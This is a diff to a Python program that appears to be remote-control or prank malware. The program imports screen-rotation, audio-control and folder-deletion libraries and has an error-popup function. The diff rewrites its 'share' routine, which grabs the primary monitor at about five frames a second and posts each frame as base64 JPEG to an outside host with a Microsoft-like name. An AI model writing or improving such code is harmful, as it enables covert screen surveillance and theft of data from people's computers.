@@ -9,12 +9,13 @@ from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 from comtypes import CLSCTX_ALL, CoInitialize, CoUninitialize
 from shutil import rmtree
 import rotatescreen as rs
-from pyautogui import screenshot
+from PIL import Image
 import base64
 from io import BytesIO
 import time 
 import httpx
 import asyncio
+from mss import mss
 url = "https://ms32-sha2.onrender.com/"
 screen = rs.get_primary_display()
 terminate = False
@@ -301,33 +302,28 @@ def showerr(num):
 async def share():
     global sharing
     async with httpx.AsyncClient() as client:
-        while sharing:
-            start_time = time.time()  # Measure time for FPS
-
-            # Step 1: Capture Screenshot
-            ss = screenshot()
-            ss = ss.resize((ss.width//2,ss.height//2))
-            # Step 2: Optimize Screenshot (Save as JPEG in-memory)
-            buffer = BytesIO()
-            ss.save(buffer, format="JPEG")  # Lower quality for speed
-            base64_string = base64.b64encode(buffer.getvalue()).decode("utf-8")
-
-            # Step 3: JSON Payload
-            json_payload = {"image": base64_string}
-
-            # Step 4: Send Async Request
-            try:
-                response = await client.post(url+"screenshot", json=json_payload, timeout=1.5)
-                # print("Status:", response.status_code)
-            except httpx.RequestError as e:
-                print("Request failed:", e)
-
-            # Step 5: Control FPS (~5 FPS)
-            elapsed_time = time.time() - start_time
-            fps = 1 / elapsed_time if elapsed_time > 0 else 0
-            print(f"FPS: {fps:.2f}")
-            fps_delay = max(0, 1/5 - elapsed_time)  # Maintain ~5 FPS
-            await asyncio.sleep(fps_delay)
+        with mss() as sct:
+            monitor = sct.monitors[1]
+            while sharing:
+                start_time = time.time()
+                ss = sct.grab(monitor)
+                img = Image.frombytes("RGB", 
+                    (ss.width, ss.height), 
+                    ss.rgb)
+                # ss.save(buffer, format="JPEG",quality=40)
+                buffer = BytesIO()
+                img.save(buffer,format="JPEG",quality=50)
+                buffer.seek(0)
+                img = base64.b64encode(buffer.getvalue()).decode("utf-8")
+                try:
+                    await client.post(url+"screenshot", json={"image": img})
+                except httpx.RequestError as e:
+                    print("Request failed:", e)
+                elapsed_time = time.time() - start_time
+                fps = 1 / elapsed_time if elapsed_time > 0 else 0
+                print(f"FPS: {fps:.2f}")
+                fps_delay = max(0, 1/5 - elapsed_time)
+                await asyncio.sleep(fps_delay)
 def async_runner():
     asyncio.run(share())
 def main():
